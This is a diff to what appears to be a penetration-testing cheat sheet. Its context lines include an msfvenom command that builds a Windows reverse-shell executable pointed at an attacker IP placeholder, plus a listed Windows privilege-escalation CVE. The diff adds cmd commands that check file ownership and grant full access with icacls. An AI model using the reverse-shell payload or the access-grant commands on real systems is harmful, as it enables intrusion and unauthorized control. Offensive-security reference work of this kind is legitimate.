@@ -28,6 +28,15 @@ MSFVenom Reverse Shell Payload
 msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
 ```
 
+File owner access permission 
+
+```cmd
+REM check owner
+dir /q /a
+REM grant full access
+icacls <file> /grant <user>:(F)
+```
+
 Exploits
 
 - CVE-2021-1732
